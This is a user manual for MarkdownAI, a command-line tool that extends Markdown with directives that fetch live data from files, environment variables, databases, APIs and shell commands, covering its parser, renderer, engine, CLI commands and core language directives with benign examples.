# MarkdownAI — User Manual

> documentation that cannot lie.

**Version:** 1.0.0  
**Generated:** 2026-05-24

MarkdownAI is a superset of Markdown that makes your documents "live." Instead of writing documentation that drifts from reality the moment your code or data changes, MarkdownAI documents fetch their information directly from the sources that power your application - databases, APIs, the filesystem, environment variables, shell commands - and render fresh, accurate output every time you run them.

The result is documentation that is always current and always honest. When you run `mai render`, the document reflects what your system actually is, not what it was when someone last bothered to update it.

MarkdownAI ships as `mai`, a globally-installed command-line tool. It processes any `.md` file that begins with the `@markdownai` header directive. Everything else in the file is standard Markdown, extended with directives that let you fetch, filter, transform, and display live data. It is organized as a six-package npm monorepo and supports 90 features across the language, security, caching, AI-native, MCP integration, VS Code extension, and @db query system - all documented in this manual.

---

## Table of Contents

1. [Overview](#overview)
2. [Features](#features)
   - **Core Engine**
   - [Parser — AST Production](#parser--ast-production)
   - [Renderer — Output Format Modules](#renderer--output-format-modules)
   - [Engine — AST Execution](#engine--ast-execution)
   - [CLI Core — mai render, validate, parse, eval](#cli-core--mai-render-validate-parse-eval)
   - **Language Features**
   - [Header Declaration and Runtime Detection](#language--header-declaration-and-runtime-detection)
   - [Inline Interpolation {{ }}](#language--inline-interpolation--)
   - [@env Environment Variables](#language--env-environment-variables)
   - [@define and @call Macros](#language--define-and-call-macros)
   - [File Resolution Model](#language--file-resolution-model)
   - [@include Content Inclusion](#language--include-content-inclusion)
   - [@import Definition Import](#language--import-definition-import)
   - [@if Conditionals and Expression System](#language--if-conditionals-and-expression-system)
   - [Pipe Operator and @render](#language--pipe-operator-and-render)
   - [@list Source Directive](#language--list-source-directive)
   - [@read Source Directive](#language--read-source-directive)
   - [@tree, @date, @count Utility Directives](#language--tree-date-count-utility-directives)
   - [@connect Database Registry](#language--connect-database-registry)
   - [@db Database Query Directive](#language--db-database-query-directive)
   - [@http HTTP Request Directive](#language--http-http-request-directive)
   - [@query Shell Command Directive](#language--query-shell-command-directive)
   - [@phase, @on complete, and @graph](#language--phase-on-complete-and-graph)
   - [Standard Library (stdlib)](#standard-library-stdlib)
   - [match Operator — Regex Matching in Expressions](#match-operator---regex-matching-in-expressions)
   - [@note Directive](#note-directive)
   - [@event Directive](#language---event-directive)
   - [@foreach and @set — Iteration and Variable Assignment](#foreach-and-set---iteration-and-variable-assignment)
   - [@read-frontmatter and @update-frontmatter — Frontmatter Access](#read-frontmatter-and-update-frontmatter---frontmatter-access)
   - [@render-template — Document Scaffolding](#render-template---document-scaffolding)
   - [@template and @data — Reusable Partials with Bound Data](#template-and-data---reusable-partials-with-bound-data)
   - [@test and @check — Code Quality Directives](#test-and-check---code-quality-directives)
   - [@hash — Content Verification](#hash---content-verification)
   - [Write Directives — @mkdir, @copy, @append-if-missing](#write-directives---mkdir-copy-append-if-missing)
   - **Security**
   - [Security Config, Runtime Modes, Audit Log](#security--config-file-runtime-modes-audit-log)
   - [Filesystem Confinement and Content Masking](#security--filesystem-confinement-and-content-masking)
   - [Shell Execution Jail (@query)](#security--shell-execution-jail-query)
   - [Database Query Jail (@db)](#security--database-query-jail-db)
   - [HTTP Request Jail (@http)](#security--http-request-jail-http)
   - [Built-in Immutable Rules](#security--built-in-immutable-rules)
   - **Auxiliary Tooling**
   - [Caching — @cache Modifier System](#caching--cache-modifier-system)
   - [Stripper — mai strip Command](#stripper--mai-strip-command)
   - [MCP Server — AI Integration](#mcp-server--ai-integration)
   - [Hook — PreToolUse AI Routing](#hook--pretooluse-ai-routing)
   - [CLI Complete — All Remaining mai Commands](#cli-complete--all-remaining-mai-commands)
   - **Testing**
   - [E2E Test Suite — Fixture Files and CLI Verification](#e2e-test-suite--fixture-files-and-cli-verification)
   - [Run-State Tests - Pre-Publish Verification](#run-state-tests---pre-publish-verification)
   - **AI-Native Features**
   - [AI — Consumer-Targeted Conditional Rendering](#ai--consumer-targeted-conditional-rendering-planned--not-yet-implemented)
   - [AI — @prompt Directive](#ai--prompt-directive-embedded-ai-instructions)
   - [AI — Context Budget, Section Priority, and Chunk Boundaries](#ai--context-budget-section-priority-and-chunk-boundaries-planned--not-yet-implemented)
   - [AI — @define-concept (Inline Glossary Injection)](#ai--define-concept-inline-glossary-injection-planned--not-yet-implemented)
   - [AI — @constraint Directive (Machine-Readable Rules)](#ai--constraint-directive-machine-readable-rules-planned--not-yet-implemented)
   - [AI — Token-Efficient Format Mode](#ai--token-efficient-format-mode---formatai-planned--not-yet-implemented)
   - [AI — E2E Accuracy Tests and Format Benchmarks](#ai--e2e-accuracy-tests-and-format-benchmarks-planned--not-yet-implemented)
   - **MCP End-to-End**
   - [MCP E2E — Protocol Conformance](#mcp-e2e--protocol-conformance)
   - [MCP E2E — All 8 Tools End-to-End](#mcp-e2e--all-8-tools-end-to-end-planned--not-yet-implemented)
   - [MCP E2E — Security Enforcement at MCP Boundary](#mcp-e2e--security-enforcement-at-mcp-boundary-planned--not-yet-implemented)
   - [MCP E2E — AI-Native Integration and Realistic Claude Workflow](#mcp-e2e--ai-native-integration-and-realistic-claude-workflow-planned--not-yet-implemented)
   - [MCP get_constraints Tool](#mcp-get_constraints-tool)
   - **Integration**
   - [MDD + MarkdownAI Integration](#mdd--markdownai-integration)
   - [MDD Token Economics and Accuracy Analysis](#mdd-token-economics-and-accuracy-analysis)
   - [Skill Context Variables — Claude Code Slash Command Integration](#skill-context-variables--claude-code-slash-command-integration)
   - [Shell Inline - Native !`command` Interception](#shell-inline---native-command-interception)
   - [Claude-Native Adoption](#claude-native-adoption)
   - **VS Code Extension**
   - [Package Scaffold](#vs-code-extension---package-scaffold)
   - [Language Detection](#vs-code-extension---language-definition-and-detection)
   - [Syntax Highlighting](#vs-code-extension---syntax-highlighting)
   - [Snippets](#vs-code-extension---markdownai-snippets)
   - [Completion Provider](#vs-code-extension---completion-provider)
   - [Hover Provider](#vs-code-extension---hover-provider)
   - [Go-To-Definition for Macros](#go-to-definition-for-macros)
   - [Find All References for Macros](#find-all-references-for-macros)
   - [Diagnostics Provider](#vs-code-extension---diagnostics)
   - [Live Preview](#vs-code-extension---live-preview)
   - [Extension Settings](#extension-settings)
   - [Extension Test Suite](#extension-test-suite)
   - [README and Marketplace Metadata](#readme-and-marketplace-metadata)
   - **@db Query System**
   - [@db Directive — Query Language](#db-directive---query-language)
   - [@db where Clause](#db-where-clause)
   - [@db aggregate Operation](#db-aggregate-operation)
   - [@db raw= Escape Hatch](#db-raw-escape-hatch)
   - [DB - QueryPlan Type System](#db---queryplan-type-system)
   - [DB - Executor](#db---executor)
   - [DB - DbAdapter Interface](#db---dbadapter-interface)
   - [DB - MongoDB Adapter](#db---mongodb-adapter)
   - [DB - SQL Adapters (PostgreSQL, MySQL, MSSQL, SQLite)](#db---sql-adapters-postgresql-mysql-mssql-sqlite)
   - [DB - Security System](#db---security-system)
   - [DB - Caching Integration](#db---caching-integration)
   - [DB - Error Handling](#db---error-handling)
   - **Toolchain**
   - [Engine Bug Fixes](#engine-bug-fixes)
   - [Package README Files - All npm Packages](#package-readme-files---all-npm-packages)
   - [Directive Execution Tracing (dev tooling)](#engine---directive-execution-tracing-dev-tooling)
3. [Operations](#operations)
   - [Release Runbook](#release-runbook)
4. [Command Reference](#command-reference)
5. [Configuration Reference](#configuration-reference)

---

## Overview

MarkdownAI solves a problem every team eventually hits: documentation lies. Not on purpose — it just gets old. The database schema changes, the API adds a field, the environment variable gets renamed, but the docs stay frozen at the moment someone last had time to update them.

MarkdownAI fixes this by making documents executable. Add `@markdownai` to the first line of any `.md` file, and it becomes a live document. You can fetch the current state of your database, call an API, read a config file, run a shell command, count source files, or inject an environment variable — all inline, using a readable directive syntax that lives alongside your prose.

The document is rendered with `mai render`. Every directive runs, every data source is queried, and the final output is clean, standard Markdown. Strip the directives away with `mai strip` to get a static export. Or serve the document live to an AI assistant via the built-in MCP server — where lazy phase loading ensures the AI always sees exactly what is relevant right now.

Security is enforced at every layer. Jailed directives (database queries, HTTP calls, shell commands) are blocked by default and must be explicitly allowed. File access is confined to the document root. Content masking prevents credentials from appearing in rendered output. And a set of immutable rules — hardcoded, impossible to override — blocks the most dangerous operations regardless of configuration.

---

## Features

### Core Engine

<!-- mdd-section: 01-parser -->
### Parser — AST Production

The MarkdownAI parser reads your `.md` documents and converts them into a structured representation that the rest of the toolchain can act on. It understands every MarkdownAI directive — from database queries to conditional blocks — so downstream components know exactly what a document is asking for, without anything being executed yet.

#### What It Does

When you run any `mai` command, the parser is the first thing that runs. It reads your document line by line, recognises all special directives (lines starting with `@`), inline expressions (`{{ }}`), pipe chains, graph blocks, and conditional sections, then hands a complete structural map to the rest of the tool. The parser is intentionally inert — it never fetches data, reads files, or touches any external resource. That separation means you can parse a document safely in any environment without side effects.

#### How To Use It

The parser runs automatically whenever you invoke `mai`. You do not call it directly. Any `.md` file must begin with `@markdownai` (optionally followed by a version pin, e.g. `@markdownai v1.0`) on the very first line, or as the first line after a YAML frontmatter block (`---` ... `---`) - if that line is missing, the file is treated as plain Markdown and no further processing occurs.

Write your directives one per line. The parser enforces a small set of structural rules:

- Block directives like `@define`, `@phase`, and `@if` must be closed with `@end` or `@endif`.
- Pipe chains (`@list ./src/ | sort | @render type="list"`) are written on a single line and count as one directive.
- Inside a `@phase` block, `@on complete ->` triggers a transition to another phase or macro.
- Unknown `@directives` are never errors — the parser passes them through untouched.

#### Examples

Start every MarkdownAI document with the header directive:

```
@markdownai v1.0
```

Pin a specific version so the document behaves predictably as the language evolves:

```
@markdownai v1.0

@connect mydb sqlite://./data.db
@query mydb SELECT count(*) FROM orders
```

Use a pipe chain to fetch, transform, and render in one line:

```
@list ./src/ | sort | @render type="list"
```

Use an inline expression anywhere in prose:

```
This report was generated on {{ @date format="YYYY-MM-DD" }}.
```

<!-- /mdd-section: 01-parser -->

<!-- mdd-section: 02-renderer -->
### Renderer - Output Format Modules

The renderer takes data piped from a directive and turns it into formatted markdown output. It supports eleven output formats, from plain lists and tables to ASCII charts and diagrams. Every format renders as plain text - no images, no JavaScript, no external dependencies.

#### What It Does

When you pipe data through a MarkdownAI directive, the renderer decides how that data appears in the final document. You pick a format type, and the renderer handles the layout. A list of database rows can become a markdown table, a bar chart, a JSON block, or a flow diagram - same data, different shape. All visual formats (bar charts, flow diagrams, timelines, trees) use ASCII characters, so they display correctly in terminals, AI context windows, email clients, and anywhere plain text is readable.

#### How To Use It

Specify a format using the `--format` flag on a data directive. The renderer takes the piped output and wraps it in the chosen layout before writing it into your document.

```
@db query="SELECT name, score FROM results" --format=bar
```

For tabular data, you can also pass column names:

```
@db query="SELECT name, email FROM users" --format=table --columns="Name,Email"
```

The format types are:

- `list` - unordered markdown bullet list
- `numbered` - ordered numbered list
- `links` - list of clickable markdown links
- `table` - GFM pipe table with header row and alignment dashes
- `code` - fenced code block (language auto-detected from content when possible)
- `inline` - data joined as a plain string, no wrapping, for embedding a value mid-sentence
- `bar` - horizontal ASCII bar chart using block characters
- `flow` - ASCII flow diagram with left-to-right arrows
- `tree` - indented ASCII tree using branch characters
- `timeline` - left-to-right ASCII timeline with arrow connectors
- `json` - pretty-printed JSON in a fenced code block

#### Commands

| Command | Description | Flags |
|---------|-------------|-------|
| `--format=<type>` | Sets the output format for the directive | Required to use any format other than the default |
| `--columns="A,B,C"` | Names the columns when rendering tabular data | Used with `table` format |

#### Configuration

No global configuration is needed. Format is set per-directive. If you omit `--format`, the renderer falls back to the directive's default output behavior.

The `inline` format is the only one that produces no markdown wrapping at all - it joins all values with a space and inserts them directly. Use it when you want a live value inside a sentence rather than as a block element.

#### Examples

**Bar chart from a query result:**

```
@db query="SELECT label, value FROM metrics" --format=bar
```

Renders as fixed-width horizontal bars, labels left-aligned, bars scaled to the largest value.

**Markdown table with named columns:**

```
@http url="https://api.example.com/users" --format=table --columns="ID,Name,Role"
```

Produces a GFM pipe table ready for any markdown renderer.

**Inline scalar value embedded in prose:**

```
The current version is @env var="APP_VERSION" --format=inline, released last week.
```

The env value drops directly into the sentence with no surrounding list or block.

**ASCII tree for a nested structure:**

```
@read path="./config.json" --format=tree
```

Renders the JSON structure as an indented tree using `├──`, `└──`, and `│` characters.

<!-- /mdd-section: 02-renderer -->

<!-- mdd-section: 03-engine -->
### Engine - AST Execution

The engine is what makes a MarkdownAI document "live." When you run `mai render`, the engine walks the AST the parser produced and resolves every node - fetching values, expanding macros, evaluating conditions, running pipes - until the whole document is a flat string of output.

#### What It Does

The engine processes each node in order and produces a string. Static markdown passes through unchanged. Directives get executed: environment variables are resolved, conditionals pick a branch, macros expand inline, phases filter which sections run, and pipe commands chain together to transform data. The result is always a fully rendered document with no unresolved syntax left over.

Security checks run before every execution - file paths, shell commands, HTTP URLs, and database operations are all validated before the engine touches them. Expression evaluation uses `vm.runInNewContext`, never `eval()`.

#### How To Use It

**Environment resolution**

When a directive references a variable, the engine looks it up in this order - the first match wins:

1. `process.env` (always wins, cannot be overridden)
2. Values from `--env` files you pass on the CLI
3. The `@import` fallback registry (values registered by `@import` directives)
4. The `fallback=` attribute on the directive itself
5. Empty string - unresolved variables never cause an error by default

To override a value for a single render without changing your environment:

```
mai render doc.md --env .env.staging
```

**Caching**

The engine has two cache layers. The session cache lives in memory and avoids re-executing the same directive twice in one render pass. The persist cache writes to `~/.markdownai/cache/` and survives across runs.

Cache keys are computed from the directive type and its options, so changing any option invalidates the entry automatically. Sensitive values are masked before anything is written to disk.

Use `--cache=persist` to opt into disk caching, or `--cache=mock` during development to read from a fixture file instead of executing the directive at all.

**Pipe commands**

Pipe stages chain after any directive that produces text output. The built-in commands run as pure Node.js - no shell is spawned, so they work the same on Windows and Unix:

- `grep <pattern>`, `grep -v <pattern>`, `grep -i <pattern>`
- `sort`, `sort -r`, `sort -n`, `sort -rn`
- `head -n N`, `tail -n N`
- `wc -l`
- `uniq`

Shell commands like `awk` and `jq` are also supported but require a Unix/WSL environment.

**Phase filtering**

Wrap content in `@phase` blocks to make sections conditional on the active phase. The engine only walks a phase block if it matches the current phase - everything else is silently skipped. Set the active phase via context or the `--phase` flag.

#### Examples

Resolve an env variable with a fallback:

```markdown
@markdownai v1.0

Server: @env DATABASE_HOST fallback=localhost
```

Filter log lines and keep only errors:

```markdown
@markdownai v1.0

@read logs/app.log | grep ERROR | tail -n 20
```

Use a phase to show deployment notes only in the `deploy` phase:

```markdown
@markdownai v1.0

@phase deploy
  @note visible
    Deployment checklist goes here.
  @end
@end
```

Cache an HTTP call to disk so repeated renders stay fast:

```markdown
@markdownai v1.0

@http https://api.example.com/status cache=persist ttl=300
```

<!-- /mdd-section: 03-engine -->

<!-- mdd-section: 04-cli-core -->
### CLI Core - mai render, validate, parse, eval

The `mai` binary is the main entry point for MarkdownAI. It ships four commands that cover the full document lifecycle: rendering live output, validating before you commit, inspecting the parsed AST, and testing expressions on the spot.

#### What It Does

Every `mai` command reads a MarkdownAI document, processes its directives, and gives you back something useful - rendered markdown, a validation report, raw JSON, or the result of a single expression. The four commands map to four stages of working with a document: you render it to see output, validate it to catch problems, parse it to inspect structure, and eval to test logic.

All four commands share a common set of flags that control environment loading, working directory, and output verbosity.

#### How To Use It

Run any command with a file path and optional flags. Rendered output goes to stdout by default - pipe it, redirect it, or use `-o` to write directly to a file. Validation exits with a non-zero code if errors are found, so it integrates cleanly into CI pipelines. Parse output is JSON, which you can pipe into `jq` or any other tool. Eval takes a quoted expression string and prints the result.

#### Commands

| Command | Description | Key Flags |
|---------|-------------|-----------|
| `mai render <file>` | Execute the document and print rendered markdown | `-o <path>`, `--strict`, `--verbose` |
| `mai validate <file>` | Check the document for errors and warnings without rendering | `--strict` |
| `mai parse <file>` | Print the parsed AST as JSON | `--node <type>`, `--pretty` |
| `mai eval "<expression>"` | Evaluate a single expression against the current environment | `--env <file>` |

**Universal flags** (work on every command):

| Flag | Effect |
|------|--------|
| `--env <file>` | Load a `.env` file before running |
| `--cwd <path>` | Override the working directory |
| `--verbose` | Print warnings to the terminal |
| `--strict` | Treat warnings as errors, halt on jailed directives |
| `--silent` | Suppress all output except fatal errors and security alerts |
| `--version` | Print the installed version |
| `--help` | Print help text |

#### Examples

Render a document and write the output to a file:

```bash
mai render docs/status.md -o docs/status-rendered.md
```

Validate before pushing to CI - exits 1 if anything is wrong:

```bash
mai validate docs/status.md --strict
```

Check what the parser sees for a specific node type:

```bash
mai parse docs/status.md --node env --pretty
```

Test whether a path exists before wiring it into a document:

```bash
mai eval "file.exists './src/enterprise/'"
# false
```

Load a specific env file for a one-off render:

```bash
mai render report.md --env .env.production -o report-prod.md
```

<!-- /mdd-section: 04-cli-core -->

---

### Language Features

<!-- mdd-section: 05-lang-header -->
### Language - Header Declaration

The `@markdownai` header on line 1 is the single thing that activates the runtime. Without it, the file is plain markdown. With it, every directive in the document becomes live.

#### What It Does

The parser reads the first meaningful line of the file. If it starts with `@markdownai`, the file is processed as a MarkdownAI document and all directives are executed. If that line is missing or placed anywhere else, the file is treated as plain markdown - no directives run, no errors, no output change.

You can pin a version with `@markdownai v1.0`. If the installed `mai` version is older than the pin, it logs a warning and continues processing rather than failing. This lets you signal intent without breaking older installs.

#### How To Use It

**New file:** Make `@markdownai` (or `@markdownai v1.0`) the very first line, then write the rest of your document below it.

**Existing markdown file:** Insert `@markdownai` as line 1. Nothing else in the file needs to change.

**File with YAML frontmatter:** If your file starts with `---`, keep the frontmatter block intact and place `@markdownai` on the first non-blank line after the closing `---`. The parser skips frontmatter automatically and checks that line.

**Removing MarkdownAI from a file:** Delete the `@markdownai` line. The rest of the file renders as ordinary markdown.

#### Examples

A minimal MarkdownAI file:

```md
@markdownai

## My Document

@env NODE_ENV
```

A file with YAML frontmatter (common in Jekyll or Hugo projects):

```md
---
title: Config Report
date: 2024-01-15
---
@markdownai v1.0

## Current Environment

@env APP_ENV
```

In both cases, `mai render <file>` processes the directives. Open the file in a standard markdown viewer and `@markdownai` renders as plain text - no broken output, no errors.

<!-- /mdd-section: 05-lang-header -->

<!-- mdd-section: 06-lang-interpolation -->
### Language - Inline Interpolation {{ }}

Wrap any expression in `{{ }}` to embed a live value directly inside a sentence. The value is evaluated at render time and dropped in place - no block directives, no line breaks, just the result sitting naturally in your prose.

#### What It Does

The double-curly syntax gives you the full expression engine right inside a paragraph. You can pull environment variables, read file metadata, check dates, count files, or run ternary logic - all without leaving the flow of your text. The same expressions that power `@if` conditions work here identically.

If an expression can't be resolved, it outputs an empty string and logs a warning. It never crashes the render or leaves raw syntax in your output.

#### How To Use It

Put `{{ expression }}` anywhere in a line of prose. The braces and everything between them get replaced with the evaluated result.

To write a literal `{{` in your output, escape it with a backslash: `\{{`.

Interpolation is **ignored** inside fenced code blocks (triple backtick) and inline backtick spans, so your code examples stay clean.

#### Examples

**Show an environment variable inline:**
```
This service connects to {{ env.API_URL ?? "http://localhost:3000" }}.
```
Outputs: `This service connects to https://api.example.com.`
Falls back to localhost if `API_URL` is not set.

**Check which environment you're running in:**
```
You are running in {{ file.exists "./config/prod.json" ? "production" : "development" }} mode.
```
Reads the filesystem at render time and picks the right word - no manual updates needed when you switch environments.

**Pull a value from package.json:**
```
Current version: {{ read ./package.json path="version" }}
```
Outputs: `Current version: 1.4.2`
The version in your docs always matches the one in your package - because it *is* the one in your package.

<!-- /mdd-section: 06-lang-interpolation -->

<!-- mdd-section: 07-lang-env -->
### Language — @env Environment Variables

`@env` lets your MarkdownAI documents read environment variables directly — so sensitive values like API keys, database URLs, or deployment settings never have to be hardcoded in your documents. You can provide fallback values for when a variable isn't set, keeping your documents functional across different environments.

#### What It Does

When you use `@env` in a document, MarkdownAI looks up the named environment variable and inserts its value. You can use it as a standalone line to output a value as its own paragraph, or embed it inline within prose using `{{ env.VARNAME }}`. You can also declare expected variables (with optional fallbacks) inside shared import files, which lets you define configuration defaults in one place and reuse them across many documents. If a variable is missing and no fallback was provided, `mai validate` will warn you before the document is rendered.

#### How To Use It

**Output a variable as a paragraph:**
Place `@env VARNAME` on its own line. The variable's value appears as a paragraph in the rendered output. Add a fallback with `fallback="your-default"` so the document still renders if the variable is unset.

**Embed a variable inline:**
Use `{{ env.VARNAME }}` inside a sentence or paragraph to insert the value mid-prose.

**Declare variables in a shared import file:**
In a file you `@import` into other documents, write `@env VARNAME fallback="default-value"`. This registers the fallback for the entire document that imports it — no output is produced in the import file itself, only the registration. Variables declared without a fallback are flagged during `mai validate` if they are unset.

**Variable resolution order:**
When resolving a variable, `mai` checks these sources in order and uses the first match:
1. Your shell environment (always wins)
2. An env file passed with `--env .env.production` (or similar)
3. Fallbacks registered via `@import` files
4. The `fallback=` value on the directive itself
5. An empty string (no error is thrown)

#### Examples

Output an API base URL as a paragraph, with a fallback:
```
@env API_BASE_URL fallback="https://api.example.com"
```

Embed a variable inline within prose:
```
The current deployment target is {{ env.DEPLOY_ENV }}.
```

Declare a default in a shared config import file:
```
@env DATABASE_URL fallback="postgres://localhost:5432/mydb"
```

Pass a custom env file when rendering:
```
mai render report.md --env .env.production
```

<!-- /mdd-section: 07-lang-env -->

<!-- mdd-section: 08-lang-macros -->
### Language — @define and @call Macros

Macros let you define reusable content blocks once and insert them anywhere in your document — with or without parameters. This eliminates copy-pasting repeated content and keeps documents consistent when shared values change.

#### What It Does

The `@define` directive creates a named block of content — anything from a static paragraph to a fully dynamic section with database queries or environment variables. The `@call` directive inserts that block wherever you need it, optionally passing values to fill in placeholders inside the block. Macros are not rendered at the point of definition; they only produce output when called. You can also mark a macro as `@local` to keep it scoped to the file that defines it, or leave it global so it is available across all files in the document.

#### How To Use It

1. Define a macro at the top of your document (or in any included file) using `@define`, followed by a name and optional parameters in parentheses.
2. Write the macro body — any content, including other directives — and close it with `@end`.
3. Use `@call` anywhere you want that content to appear, passing arguments if the macro has parameters.
4. Use `{{ param || "default value" }}` inside the macro body to provide fallback values for parameters that are not passed at call time.
5. Add `@local` after the macro name to restrict the macro to the current file and its children.

#### Examples

**Simple macro with no parameters:**
```
@define disclaimer
This report is generated automatically and may contain estimates.
@end

@call disclaimer
```

**Macro with parameters and a default:**
```
@define greeting(name, role)
Hello, {{ name || "reader" }}. Your role is {{ role || "viewer" }}.
@end

@call greeting(name=Alice, role=Admin)
@call greeting(name=Bob)
```

**Local-scoped macro (not shared with other files):**
```
@define internal-note @local
For internal review only — do not distribute.
@end

@call internal-note
```

<!-- /mdd-section: 08-lang-macros -->

<!-- mdd-section: 09-lang-file-resolution -->
### Language — File Resolution Model

When your documents include or import other files, MarkdownAI carefully tracks which files have already been processed. This prevents infinite loops caused by circular references, and ensures that diamond dependencies — where two files both pull in the same third file — are handled predictably without duplication or errors.

#### What It Does

As MarkdownAI processes your documents, it keeps a running record of which files are currently being resolved and which have already finished. This lets it catch the moment a file tries to include itself (directly or through a chain of other files), and it knows whether a file that appears more than once should be skipped or rendered again depending on how it was referenced.

#### How To Use It

This feature works automatically — you do not need to configure anything. Simply use `@include` and `@import` directives in your documents as normal. If a circular reference is detected, processing stops immediately with a clear error message showing the full chain of files involved and the exact line where the cycle occurs. If a file is imported more than once, the second occurrence is silently skipped. If a file is included more than once, it renders at each call site — intentional repetition is fully supported.

#### Examples

**Circular reference — will halt with an error:**
```
a.md includes b.md, and b.md imports a.md
→ ERROR: Circular reference detected
    a.md (line 5)  @include b.md
    b.md (line 12) @import  a.md  ← cycle here
    Chain: a.md → b.md → a.md
```

**Diamond dependency with @import — second occurrence is skipped silently:**
```
a.md imports shared.md
b.md imports shared.md
c.md imports a.md and b.md
→ shared.md definitions are registered once; the second @import is a no-op
```

**Diamond dependency with @include — renders at both sites:**
```
page.md includes header.md twice (or via two different paths)
→ header.md content appears at both locations — this is intentional and valid
```

<!-- /mdd-section: 09-lang-file-resolution -->

<!-- mdd-section: 10-lang-include -->
### Language — @include Content Inclusion

The `@include` directive pulls another Markdown file's content directly into your document at the point where you write it. This lets you break large documents into reusable pieces and share macro and connection definitions across files without duplicating them.

#### What It Does

When you include a file, its full rendered content appears inline in your document — as if you had written it there yourself. Any macros, connections, or environment fallbacks defined in the included file automatically become available to the rest of your parent document too. This "bubble-up" of definitions means you can keep shared configuration in a single file and include it wherever it is needed.

#### How To Use It

Write `@include` followed by a relative path to the file you want to pull in. The path must be relative to the file that contains the directive — absolute paths and paths that navigate above your document root are blocked for security reasons. To conditionally include content, wrap `@include` inside an `@if` block rather than adding a condition directly on the `@include` line.

To keep definitions from leaking into the parent document, mark them `@local` inside the included file. You can also control caching behaviour by adding a `@cache` modifier (`session`, `persist`, `ttl`, or `mock`) as the last token on the line.

#### Examples

Include a shared configuration file:
```
@include ./shared/config.md
```

Include a file and cache its output for the session:
```
@include ./data/metrics.md @cache session
```

Conditionally include enterprise-only content using an `@if` block:
```
@if env.TIER == "enterprise"
  @include ./sections/enterprise-features.md
@end
```

<!-- /mdd-section: 10-lang-include -->

<!-- mdd-section: 11-lang-import -->
### Language — @import Definition Import

The `@import` directive lets you share reusable definitions — macros, database connections, and environment variable defaults — across multiple documents from a single source file. It solves the problem of duplicating setup code in every document that needs the same connections or macros.

#### What It Does

When you import a file, `mai` reads it and pulls in everything defined inside it: macros (`@define`), connection settings (`@connect`), and environment variable fallbacks (`@env`). Only those definitions are brought into your current document — no content from the imported file ever appears in your output. This lets you maintain a central "definitions library" and keep your working documents clean.

#### How To Use It

Add an `@import` line near the top of your document, pointing to the file you want to pull definitions from. Use a path relative to the current file. All macros, connections, and environment fallbacks defined in that file become available to the rest of your document immediately.

To avoid re-parsing the same file multiple times in a session, add `@cache session` on the same line.

#### Examples

Import a shared definitions file:
```
@import ./shared/connections.md
```

Import with session caching to avoid redundant re-parsing:
```
@import ./shared/connections.md @cache session
```

Import a definitions library stored one level up:
```
@import ../config/env-defaults.md
```

<!-- /mdd-section: 11-lang-import -->

<!-- mdd-section: 12-lang-conditionals -->
### Language — @if Conditionals and Expression System

Show or hide sections of your document based on conditions — environment, file existence, or data values. This feature lets a single document serve multiple audiences or environments without maintaining separate copies.

#### What It Does

MarkdownAI's conditional system lets you wrap any block of content in `@if`/`@elseif`/`@else`/`@endif` tags. When the document is rendered or stripped, only the blocks whose conditions are true appear in the output. The same expression syntax — operators, file checks, and logical combinators — works everywhere in MarkdownAI: inside `@if` conditions, `where` filters on data queries, and interpolation expressions. Learn the operators once and they work throughout.

#### How To Use It

Wrap content in an `@if` block using any supported condition. Chain additional branches with `@elseif`, provide a fallback with `@else`, and close every block with `@endif`. Nesting is fully supported — inner `@if` blocks are matched to their own `@endif`.

Before stripping or rendering a document that uses conditionals, always supply your environment file so variables resolve correctly:

```
mai strip --env .env.production my-doc.md
```

Run `mai validate` first to catch any unset variables before they silently evaluate to false.

#### Examples

**Show content only in production:**
```markdown
@if env.APP_ENV == "production"
This section only appears in production builds.
@else
You are viewing a non-production build.
@endif
```

**Check whether a file exists:**
```markdown
@if file.exists "./config/custom.json"
Custom configuration detected.
@elseif file.isDir "./config"
Config directory found but no custom.json.
@else
No configuration found.
@endif
```

**Combine conditions with logical operators:**
```markdown
@if env.ROLE == "admin" && env.REGION == "us-east"
Admin dashboard — US East region
@endif
```

<!-- /mdd-section: 12-lang-conditionals -->

<!-- mdd-section: 13-lang-pipeline -->
### Language — Pipe Operator and @render

The pipe operator lets you chain data sources through filtering and transformation steps before rendering the result — all inside a single document line. This brings Unix-style composability to your MarkdownAI documents, keeping data fresh and the logic readable.

#### What It Does

The pipe operator (`|`) connects a data-fetching directive to one or more transform steps, then to a final `@render` sink that controls how the output appears in your document. You can filter, sort, slice, and shape data before it ever hits the page. Built-in transforms like `grep`, `sort`, `head`, and `tail` run as pure cross-platform code — no shell required — so your documents work the same on Windows, macOS, and Linux. If you need more power, shell utilities like `awk`, `jq`, or `sed` are also supported on Unix and WSL.

#### How To Use It

Build a pipe expression on a single line: start with a source directive, add one or more transform commands separated by `|`, and end with either `@render` (to format the output) or a command whose result gets inlined directly as a value.

For `@render`, specify a `type` to control the output format. Available types are: `list`, `numbered`, `links`, `table`, `code`, `inline`, `bar`, `flow`, `tree`, `timeline`, and `json`.

As a shortcut, you can add `as="type"` directly on any source directive — this is equivalent to appending `| @render type="type"` at the end of the pipe.

If you skip `@render` and end the pipe with a command (for example `wc -l`), the raw output is inlined as a plain scalar value — useful for embedding a live count or single value mid-sentence.

On Windows without WSL, shell-dependent commands (`awk`, `sed`, `jq`, etc.) are automatically skipped with a warning rather than crashing. Run `mai validate` to check your document for platform compatibility issues before sharing.

#### Examples

Filter a file list to only TypeScript files and render as a numbered list:
```
@list ./src/ | grep \.ts$ | sort | @render type="numbered"
```

Count the number of source files and inline the result:
```
There are @list ./src/ | wc -l files in this project.
```

Use the `as` shorthand to render a data source directly as a table:
```
@query db="mydb" sql="SELECT name, status FROM tasks" as="table"
```

<!-- /mdd-section: 13-lang-pipeline -->

<!-- mdd-section: 14-lang-sources-list -->
### Language — @list Source Directive

The `@list` directive makes it easy to pull live data into your documents from files on disk, JSON files, and CSV files. Instead of copying and pasting static snapshots, your document reads the real data every time it renders, so it can never drift out of sync.

#### What It Does

`@list` is the primary way to enumerate things in a MarkdownAI document. You can list files and folders matching a pattern, pull items out of a JSON array or object, or read rows from a CSV file. The results appear directly in your document as a table, list, or any other format you choose. You can filter, reshape, and slice the data using built-in options — no scripting required.

#### How To Use It

Add an `@list` line to your document, specifying the file or folder you want to read. Control what gets included using the options described below. For structured data (JSON, CSV), use `where` to filter rows and `columns` to pick which fields appear. Use `as` to control how the output is rendered (for example, as a table or a list). Add `@cache` at the end of the line to cache the result across renders.

#### Configuration

| Option | What It Controls | Example Values | Default |
|---|---|---|---|
| `match` | Glob pattern for filesystem listing | `**/*.ts`, `*.md` | `*` |
| `type` | Whether to list files, directories, or both | `files`, `dirs`, `both` | `files` |
| `depth` | How many folder levels deep to search | Any number | Unlimited |
